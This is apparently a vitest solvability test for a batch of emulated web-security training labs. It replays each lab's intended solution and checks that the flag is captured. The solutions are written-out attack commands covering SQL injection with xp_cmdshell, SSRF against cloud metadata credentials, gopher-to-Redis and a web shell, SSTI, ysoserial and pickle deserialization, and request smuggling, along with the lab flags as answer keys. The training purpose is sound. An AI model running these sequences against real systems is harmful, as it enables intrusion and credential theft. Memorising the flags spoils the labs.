import { describe, it, expect } from 'vitest'
import fs from 'node:fs'
import path from 'node:path'
import { createSession } from './session'

// End-to-end solvability check for the web injection/SSRF/deser lab batch.
// Loads the REAL fixture bundles from content/labs, replays the intended
// solution with the emulated tools, and asserts `check` passes. If a lab stops
// being solvable in the engine, this fails.
const dir = path.resolve(process.cwd(), '../content/labs')
const WD = '/home/student/task'
const CHECK = "grep -q 'nto{' found.txt"

function load(id) {
  return JSON.parse(fs.readFileSync(path.join(dir, `${id}.json`), 'utf8'))
}

const LABS = [
  {
    id: 'web-sqli-dbms', flag: 'nto{sql1t3_f1ng3rpr1nt_by_err0r}', hints: 4,
    solution: [
      `curl -s 'https://shop.example/product?id=1%27'`,
      `curl -s 'https://shop.example/product?id=1 ORDER BY 4'`,
      `curl -s "https://shop.example/product?id=-1 UNION SELECT 1,password,3 FROM users" > found.txt`,
    ],
  },
  {
    id: 'web-sqli-dbms-open', flag: 'nto{mysql_un10n_t0_0utf1l3_rce}', hints: 4,
    solution: [
      `curl -s "https://shop.t/?id=-1 UNION SELECT 1,GROUP_CONCAT(username,0x3a,password),3 FROM users-- -" > found.txt`,
    ],
  },
  {
    id: 'web-sqli-dbms-enterprise', flag: 'nto{mssql_xp_cmdshell_sys4dm1n}', hints: 4,
    solution: [
      `curl -s "https://intranet.t/report?id=1; EXEC xp_cmdshell 'type /flag.txt'-- -" > found.txt`,
    ],
  },
  {
    id: 'web-ssrf-core', flag: 'nto{ssrf_m3t4d4t4_1am_cr3ds}', hints: 4,
    solution: [
      `curl -s -d 'avatar_url=http://127.0.0.1:80/' https://shop.local/profile/avatar`,
      `curl -s -d 'avatar_url=http://169.254.169.254/latest/meta-data/iam/security-credentials/my-role' https://shop.local/profile/avatar > found.txt`,
    ],
  },
  {
    id: 'web-ssrf-advanced', flag: 'nto{ssrf_g0ph3r_r3d1s_t0_rce}', hints: 4,
    solution: [
      `curl -s -d 'avatar_url=gopher://127.0.0.1:6379/_PING' https://shop.local/profile/avatar`,
      `curl -s --data-urlencode 'avatar_url@gopher.txt' https://shop.local/profile/avatar`,
      `curl -s 'https://shop.local/shell.php?cmd=cat /flag.txt' > found.txt`,
    ],
  },
  {
    id: 'web-ssrf-cloud-deep', flag: 'nto{1mds_v2_t0k3n_byp4ss_ssrf}', hints: 4,
    solution: [
      `curl -s 'https://shop.local/profile/avatar' -d 'url=http://169.254.169.254/latest/meta-data/iam/security-credentials/'`,
      `curl -s -X PUT 'https://shop.local/profile/avatar' -d 'url=http://169.254.169.254/latest/api/token' -H 'X-aws-ec2-metadata-token-ttl-seconds: 21600'`,
      `curl -s 'https://shop.local/profile/avatar' -d 'url=http://169.254.169.254/latest/meta-data/iam/security-credentials/shop-ec2-role' -H 'X-aws-ec2-metadata-token: AQAAAExampleToken' > found.txt`,
    ],
  },
  {
    id: 'web-nosql-dbms', flag: 'nto{r3d1s_4n0nym0us_r3s3t_t0k3n}', hints: 4,
    solution: [
      `nmap -sV -p 27017,6379,9200,5984 shop.local`,
      `redis-cli -u redis://shop.local:6379 KEYS '*'`,
      `redis-cli -u redis://shop.local:6379 GET admin:reset_token > found.txt`,
    ],
  },
  {
    id: 'web-nosql-ldap-xpath', flag: 'nto{n0sql_0p3r4t0r_byp4ss_4dm1n}', hints: 4,
    solution: [
      `curl -s -X POST https://shop.local/api/login -H 'Content-Type: application/json' --data-binary @bypass.json > found.txt`,
    ],
  },
  {
    id: 'web-ssti-core', flag: 'nto{jinja2_subcl4ss3s_t0_rce}', hints: 4,
    solution: [
      `curl -s 'https://shop.local/greet?name={{7*7}}'`,
      `curl -s --data-urlencode 'name={{config}}' https://shop.local/greet`,
      `curl -s --data-urlencode 'name@rce.txt' https://shop.local/greet > found.txt`,
    ],
  },
  {
    id: 'web-ssti-advanced', flag: 'nto{s4ndb0x_3sc4p3_v14_4ttr}', hints: 4,
    solution: [
      `curl -s --data-urlencode 'name={{7*7}}' https://shop.local/greet`,
      `curl -s --data-urlencode 'name@escape.txt' https://shop.local/greet`,
      `curl -s --data-urlencode 'name@rce.txt' https://shop.local/greet > found.txt`,
    ],
  },
  {
    id: 'web-deser-expert', flag: 'nto{java_d3s3r_cc6_rce}', hints: 4,
    solution: [
      `base64 -d session.b64 | xxd -l 8`,
      `unzip -l shop.war`,
      `ysoserial.jar CommonsCollections6 'cat /flag.txt' > payload.b64`,
      `curl -s -b @payload.b64 https://shop.local/ > found.txt`,
    ],
  },
  {
    id: 'web-deser-languages', flag: 'nto{pyth0n_p1ckl3_r3duc3_rce}', hints: 4,
    solution: [
      `base64 -d cart.b64 | xxd -l 8`,
      `python3 pickle_rce.py > payload.b64`,
      `curl -s -b @payload.b64 https://shop.local/cart > found.txt`,
    ],
  },
  {
    id: 'web-request-smuggling-advanced', flag: 'nto{cl0_smuggl3_qu3u3_p01s0n}', hints: 4,
    solution: [
      `curl -s 'http://shop.local/' --data-binary @clte.txt -H 'Transfer-Encoding: chunked'`,
      `curl -s 'http://shop.local/favicon.ico' --data-binary @cl0.txt > found.txt`,
    ],
  },
  {
    id: 'web-waf-smuggling', flag: 'nto{cl_te_smuggl3_p4st_w4f_c4ch3_p01s0n}', hints: 4,
    solution: [
      `curl -s 'http://shop.local/admin'`,
      `curl -s 'http://shop.local/' --data-binary @smuggle.txt -H 'Transfer-Encoding: chunked' > found.txt`,
    ],
  },
  {
    id: 'web-mobile-api-bypass', flag: 'nto{m0b1l3_1d0r_b0l4_4p1_byp4ss}', hints: 4,
    solution: [
      `strings com.shop.app.apk | grep mapi`,
      `curl -s 'https://mapi.example/v2/orders/1002' -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiJ9' > found.txt`,
    ],
  },
]

describe.each(LABS)('web injection lab: $id', ({ id, flag, hints, solution }) => {
  const bundle = load(id)
  const spec = { kind: 'shell', workdir: WD, check: CHECK, hints: Array(hints).fill('h') }

  it('bundle + seed files are consistent with the lesson lab block', () => {
    expect(bundle.id).toBe(id)
    expect(bundle.workdir).toBe(WD)
    expect(bundle.fs.some((f) => f.path === `${WD}/task.md`)).toBe(true)
    expect(bundle.expect.file).toBe(`${WD}/found.txt`)
    expect(bundle.expect.contains).toBe(flag)
  })

  it('replays the intended solution and passes check', async () => {
    const s = createSession({ spec, bundle })
    expect((await s.run('check')).code).toBe(1) // not solved yet
    for (const cmd of solution) await s.run(cmd)
    expect((await s.run('check')).code).toBe(0)
  })
})
